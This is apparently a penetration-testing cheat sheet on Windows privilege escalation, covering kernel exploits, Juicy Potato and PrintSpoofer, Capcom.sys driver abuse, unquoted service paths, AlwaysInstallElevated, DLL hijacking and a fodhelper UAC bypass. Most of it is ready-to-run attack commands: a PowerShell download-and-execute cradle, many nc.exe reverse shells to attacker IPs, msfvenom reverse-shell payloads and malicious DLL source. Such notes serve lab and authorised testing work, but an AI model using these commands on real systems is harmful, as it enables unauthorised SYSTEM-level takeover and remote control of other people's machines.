---
description: >-
  Privilege Escalation usually involves going from a lower permission to a
  higher permission.
---

# Windows Privesc

## Enumeration Scripts:

There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples:

* **PowerUp.ps1:** [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* **WinPEAS:** [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) ****

{% hint style="info" %}
**Info**: [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
{% endhint %}

## Kernel Vulnerabilities

We can exploit some kernel vulnerabilities in order to privesc.

{% hint style="warning" %}
**All Windows Server 2008 R2** without **HOTFIXES** are vulenrable to MS15 and MS16 \(MS15-051\)
{% endhint %}

### Sherlock.ps1

Is a powershell script that we can run out of memory in order to find some vulnerabilities.

First we need to modify it and add the following line to the end of the script:

```text
Find-AllVulns
```

Once added, we just need to start http server and executed directly from powershell.

```text
powershell.exe IEX(New-Object System.Net.Webclient).DownloadString('http://ip-addr:port/Sherlock.ps1')
```

{% embed url="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" %}

### Suggester

 `windows-exploit-suggester.py` or `wesng` are amazing scripts that do this work.

{% embed url="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" %}

{% hint style="info" %}
**Remember** to update the database.
{% endhint %}

```text
./windows-exploit-suggester.py --update
```

We just need to execute `systeminfo` and save the output into a file on the windows target machine.

```text
systeminfo > systeminfo.txt
```

Once downloaded to our attacking machine we just need to execute the following command:

```text
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt
```

### Compiling Exploits

Sometimes we need to compile our exploits in order to get the binary or executable.

For **64-bits:**

```text
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

For **32-bits:**

```text
i686-w64-mingw32-gcc exploit.c -o exploit.exe
```

### MS09-20

```text
/opt/windows-kernel-exploits/MS09-020/MS09-020-KB970483-CVE-2009-1535-IIS6/IIS6.0.exe

Usage:
.\IIS6.0.exe "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.15 4444"
```

### MS15-051

```text
/opt/windows-kernel-exploits/MS15-051/MS15-051-KB3045171/MS15-051.exe

Usage:
.\ms15-051.exe "c:\windows\temp\nc.exe -e cmd.exe 10.10.14.15 4444"
```

### MS16-032

```text
/opt/windows-kernel-exploits/MS16-032/x64/ms16-032.exe

Usage:
.\ms16-032.exe
```

## Windows XP SP0/SP1 - upnphost

```text
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.10.10.10 4444 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

Maybe it will fail due to missing some dependency, try the following:

```text
sc config SSDPSRV start=auto
net start SSDPSRV
net stop upnphost
net start upnphost

sc config upnphost depend=""
```

{% hint style="warning" %}
**Alert**: SPACES are mandatory to the work of the exploit.
{% endhint %}

{% embed url="https://sohvaxus.github.io/content/winxp-sp1-privesc.html" %}

## Check privileges

With the following command we can check the privileges that is assigned to the pwned user:

```text
whoami /priv
```

### SeImpersonatePrivilege

#### RottenPotato \(Juicy Potato\)

Juicy Potato is another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM. Is a sugared version of Rotten Potato. [Download the latest realese](https://github.com/ohpe/juicy-potato) and execute it.

```text
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe -e cmd.exe 10.10.14.21 4444" -t *
```



#### PrintSpoofer

One way to gain system user on latest Operative System such as **Windows10 or Server 2016/2019**, is using the printspoofer exploit. [Donwload the latest release](https://github.com/itm4n/PrintSpoofer) and execute it on the target machine to gain privs.

```text
PrintSpoofer64.exe -i -c cmd
```

### SeLoadDriverPrivilege

We are able to load a driver, so we can load a vulnerable driver, then exploit it.

#### Load Capcom.sys

To load the driver we need first to create a **C++ Console APP on Visual Studio** \(Not Code!\) and paste the following script.

{% hint style="warning" %}
**Alert:** Remove line: \#include "stdafx.h"
{% endhint %}

{% embed url="https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp" %}

![EoPLoadDriver.cpp](../.gitbook/assets/eoploaddriver.png)

Once compiled With **Release x64** we need to download Capcom.sys driver. \([https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)\)

Copy the driver and the binary to the target machine and execute it.

```text
.\EoPLoadDriver.exe System\CurrentControlSet\dfserv C:\ProgramData\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\dfserv
NTSTATUS: 00000000, WinError: 0
```

{% hint style="info" %}
**NTSTATUS** codes:

0xC000003B   - `STATUS_OBJECT_PATH_SYNTAX_BAD`

0x00000034   - `STATUS_OBJECT_NAME_NOT_FOUND`
{% endhint %}

#### Exploiting Capcom.sys

I modified the following project: [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom). Download the project and open the  `ExploitCapcom.sln` \(Visual Studio Project\) with Visual Studio.

Modify the line 410 of `ExpliotCapCom.cpp` and compile it.

![ExploitCapcom.cpp](../.gitbook/assets/exploitcapcom.png)

Create the exploit.exe payload with msfvenom:

```text
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > exploit.exe
```

And upload all the files and execute the `ExploitCapcom.exe`:

```text
.\ExploitCapcom.exe
```



{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}



## Unquoted Service Path

 Every Windows service has his access route to the executable. If this route is **not quoted** and **contains** **spaces** or others separators like this example ~~_`C:\Program Files\First Folder\myexecutable.exe`_~~ , the service will try to access to the resource in the following order:

1. _`C:\Program.exe`_
2. _`C:\Program Files\First.exe`_
3. _`C:\Program Files\First Folder\myexecutable.exe`_

If we can put our executable in one of the paths that it is checked before the real route, when we restart the service we will obtain a shell.

```text
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

We need to ensure that the service is running by `LocalSystem`:

```text
sc qc <service>
```

Once we've found the binaries that are vulnerable to unquoted service path, we need to find where we have permissions to write, for that work we can use `icacls`:

```text
icacls "C:\Porgram Files"
```

{% hint style="info" %}
**Info**: We need to find some with **write** permissions **\(W\)**
{% endhint %}

Once we've found the writeable path, we will need to create our malicious binary with `msfvenom` and upload in the right directory:

```text
msfvenom -p windows/shell_reverse_tcp LHOST=<ip-addr> LPORT=<port> -f exe -o First.exe
```

Finally we need to restart the service to gain access to system:

```text
sc stop <service>
sc start <service>
```

## Always Install Elevated

**If** these 2 registers are **enabled** \(value is **0x1**\), any user can **install  `.msi`** files as `NT AUTHORITY\`**`SYSTEM`**

```text
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Creating the malicious .msi file

```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT>-f msi -o shell.msi
```

### Executing the .msi

```text
msiexec /quiet /qn /i c:\users\user\documents\shell.msi
```

{% hint style="info" %}
**Note:** I'd problems while exploiting it via WIN-RM. Try another way to get shell.
{% endhint %}

## Incorrect permissions in services

A service running as `NT AUTHORITY/SYSTEM` with incorrect file permissions might allow to escalate privileges. You can replace the binary, restart the service and get system.

Sometimes services are pointing to writeable folders:

### DLL Hijacking

When we have permissions to overwrite the DLL or the DLL is missing we can create ours.

#### Code 

The following C code is an example of our malicious dll.

```text
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe c:\Temp\nc.exe -e cmd.exe <IP> <PORT>");
        ExitProcess(0);
    }
    return TRUE;
}
```

#### Compiling the DLL

```text
#x64
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#x86
i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

### Modifying the service

```text
sc stop <service>
sc config <service> binPath="C:\Temp\nc.exe -e cmd.exe <IP> <PORT>"
sc qc <service> #Check correct assigment 
sc start <service>
```

## WSL \(Windows Subsystem for Linux\)

Windows Subsystem for Linux is a compatibility layer for running Linux binary executables natively on Windows 10 and Windows Server 2019.

Location:

```text
C:\Windows\System32\wsl.exe
```

Executing `wsl.exe` we can get a subsystem shell \(Linux\) or we can search the subsystem fileroot on the windows machine.

```text
C:\Users\User\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\
```

Inside the Linux filesystem as root, you can search for passwords or some other interesting things.

## From Administrator to System

As it is known the maximum privilege account of windows systems is `NT AUTHORITY\SYSTEM`  , so we need to spawn a shell with that account.

Once our user is already on `Administrators` group, we can check it with different forms:

```text
net user admin
net sessions   #only can execute local administrators
```

There are different forms to spawn a system shell, but I will explain one, creating a service.

```text
sc create <service_name> binpath= "C:\Users\User\nc.exe <ip-addr> <port> -e cmd.exe" type= own type= interact
```

After starting our new service we will get the System shell on our handler:

```text
sc start <service_name>
```

## Windows Scheduler

Similar to crontab, Windows Scheduler is a component of _Microsoft Windows_ that provides the ability to _schedule_ the launch of programs or scripts at pre-defined times.

If you found some of this running proceses `tasklist`, maybe you need to take a look:

```text
WScheduler.exe
WService.exe
# Some other binary that starts with WS (WindowsScheduler)
```

So we will examinate the Events System Sheduler directory: `C:\Program Files (x86)\SystemScheduler\Events` 

Find some logs files to see which program is scheduled, and replace the binary with yout malicious one.

## Bypass UAC

User Account Control \(UAC\) is an access control system that forces applications and tasks to run in the context of a non-administrative account until an administrator authorizes elevated access. 

UAC can be bypassed in various ways.

### fodhelper.exe

`fodhelper.exe` is a Microsoft support application responsible for managing language changes in the operating system. This binary runs as `high integrity` on Windows 10.

With `sigcheck.exe` from [SysInternals ](https://docs.microsoft.com/en-us/sysinternals/)is posible to inspect the application manifest.

```text
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe
```

{% hint style="info" %}
**Note:** Search for `requestedExecutionLevel` as `requireAdministrator` and `autoElevate` in `true`.
{% endhint %}

First we need to add some registries with REG:

```text
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

## References

* [https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)
* [https://blog.geoda-security.com/2017/06/elevate-from-admin-to-nt-authoritysystem.html](https://blog.geoda-security.com/2017/06/elevate-from-admin-to-nt-authoritysystem.html)
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md\#cve-2019-1388](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#cve-2019-1388)



